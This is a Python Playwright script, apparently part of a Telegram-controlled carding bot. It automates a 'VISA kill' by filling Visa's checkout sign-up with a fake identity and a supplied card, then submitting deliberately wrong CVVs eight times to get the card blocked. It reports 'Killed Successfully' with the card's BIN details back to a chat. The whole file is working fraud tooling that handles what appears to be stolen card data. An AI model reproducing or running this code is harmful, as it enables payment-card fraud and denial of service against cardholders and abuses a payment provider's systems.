import random
import time
import traceback
from playwright.async_api import BrowserContext
from worker.utils import get_fake_identity, get_wrong_cvv, split_card, get_bin_info, tg_edit, tg_admin_screenshot

TIMEOUT = 15000  # ms — original kill uses 15s waits


async def run(ctx: BrowserContext, card_input: str, chat_id: int, message_id: int) -> bool:
    page = await ctx.new_page()
    start = time.time()
    try:
        cc, mm, yy, real_cvv = split_card(card_input)
        bin_info, bin_flag = await get_bin_info(cc[:6])
        short_card = f"{cc}|{mm}|{yy}|{real_cvv}"
        identity = get_fake_identity()

        await tg_edit(
            chat_id, message_id,
            f"💳 `{short_card}`\n🔁 Starting VISA kill automation..."
        )

        await page.goto("https://secure.checkout.visa.com/createAccount", wait_until="domcontentloaded")

        # Account creation form
        await page.wait_for_selector("#firstName", state="attached", timeout=TIMEOUT)
        await page.fill("#firstName", identity["first_name"])
        await page.fill("#lastName", identity["last_name"])
        await page.fill("#emailAddress", identity["email"])

        setup_btn = await page.wait_for_selector("input.viewButton-button[value='Set Up']", timeout=TIMEOUT)
        await page.evaluate("el => el.click()", setup_btn)

        # Card details
        await page.wait_for_selector("#cardNumber-CC", state="attached", timeout=TIMEOUT)
        await page.fill("#cardNumber-CC", cc)
        await page.fill("#expiry", f"{mm}/{yy}")
        await page.fill("#addCardCVV", get_wrong_cvv(real_cvv))

        # Billing address
        await page.fill("#first_name", identity["first_name"])
        await page.fill("#last_name", identity["last_name"])
        await page.fill("#address_line1", identity["address"])
        await page.fill("#address_city", identity["city"])
        await page.fill("#address_state_province_code", identity["state"])
        await page.fill("#address_postal_code", identity["zip"])
        await page.fill("#address_phone", identity["phone"])

        # Country dropdown
        try:
            await page.evaluate("el => el.click()", await page.query_selector("#country_code"))
            await page.wait_for_selector("#rf-combobox-1-item-1", timeout=3000)
            await page.click("#rf-combobox-1-item-1")
        except Exception:
            pass

        # Finish Setup
        finish_btn = await page.wait_for_selector("input.viewButton-button[value='Finish Setup']", timeout=TIMEOUT)
        await page.evaluate("el => el.click()", finish_btn)

        # CVV loop — 8 attempts (matches original kill behavior)
        used_cvvs: set = set()
        logs = []
        for attempt in range(8):
            try:
                new_cvv = get_wrong_cvv(real_cvv)
                while new_cvv in used_cvvs:
                    new_cvv = get_wrong_cvv(real_cvv)
                used_cvvs.add(new_cvv)

                await page.wait_for_selector("#addCardCVV", state="attached", timeout=TIMEOUT)
                await page.fill("#addCardCVV", new_cvv)

                finish_btn = await page.wait_for_selector("input.viewButton-button[value='Finish Setup']", timeout=TIMEOUT)
                await page.evaluate("el => el.click()", finish_btn)
                logs.append(f"• Try {attempt + 1}: {new_cvv}")

                await page.wait_for_selector("#addCardCVV", state="attached", timeout=TIMEOUT)
            except Exception:
                logs.append(f"• Failed attempt {attempt + 1}")

        await tg_edit(
            chat_id, message_id,
            f"💳 **Card:** `{short_card}`\n"
            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
            f"🔁 **CVV Attempts:**\n" + "\n".join(logs) + "\n\n"
            f"✅ **Status:** Killed Successfully\n"
            f"⏱ **Time:** {round(time.time() - start, 2)}s"
        )
        return True

    except Exception:
        trace = traceback.format_exc()
        await tg_edit(chat_id, message_id, "❌ VISA Kill failed.")
        screenshot = await page.screenshot()
        await tg_admin_screenshot("kill", trace, screenshot)
        return False
    finally:
        await page.close()
